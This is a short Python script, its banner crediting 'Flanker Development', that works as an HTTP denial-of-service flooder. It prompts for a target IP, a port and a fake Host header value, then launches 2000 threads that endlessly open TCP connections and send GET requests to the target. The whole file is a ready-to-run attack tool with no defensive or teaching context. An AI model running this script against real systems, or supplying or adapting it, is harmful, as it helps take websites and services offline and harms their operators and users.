import socket
import threading

print("""         
___________.__                 __                  ________                     .__                                       __   
\_   _____/|  | _____    ____ |  | __ ___________  \______ \   _______  __ ____ |  |   ____ ______   _____   ____   _____/  |_ 
 |    __)  |  | \__  \  /    \|  |/ // __ \_  __ \  |    |  \_/ __ \  \/ // __ \|  |  /  _ \\____ \ /     \_/ __ \ /    \   __\
 |     \   |  |__/ __ \|   |  \    <\  ___/|  | \/  |    `   \  ___/\   /\  ___/|  |_(  <_> )  |_> >  Y Y  \  ___/|   |  \  |  
 \___  /   |____(____  /___|  /__|_ \\___  >__|    /_______  /\___  >\_/  \___  >____/\____/|   __/|__|_|  /\___  >___|  /__|  
     \/              \/     \/     \/    \/                \/     \/          \/            |__|         \/     \/     \/      
                      __________                                      __                                                       
                      \______   \_______   ____   ______ ____   _____/  |_  ______                                             
                       |     ___/\_  __ \_/ __ \ /  ___// __ \ /    \   __\/  ___/                                             
                       |    |     |  | \/\  ___/ \___ \\  ___/|   |  \  |  \___ \                                              
                       |____|     |__|    \___  >____  >\___  >___|  /__| /____  >                                             
                                              \/     \/     \/     \/          \/                                                 
""")

# Input Section

target_ip = input    ("Target Ip: "     )
select_port = input  ("Select Port: "   )
select_ipmask = input("Select Ip Mask: ")

class DenialOfService(object):
    def __init__(self, target=target_ip, port=select_port, ip_mask=select_ipmask):
        self.target = target
        self.port = int(port)  # Convert port to an integer
        self.ip_mask = ip_mask

    def run(self):
        for i in range(2000):
            thread = threading.Thread(target=self.attack).start()


    def attack(self):
        while True:
            try:
                print(f"Pinging {self.target}...")
                connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connection.connect((self.target, self.port))
                connection.send((f"GET /{self.target} HTTP/1.1\r\n").encode("ascii"))
                connection.send((f"Host: {self.ip_mask}\r\n\r\n").encode("ascii"))
                connection.close()
            except Exception as e:
                print(f"Error: {e}")


if __name__ == "__main__":
    DenialOfService().run()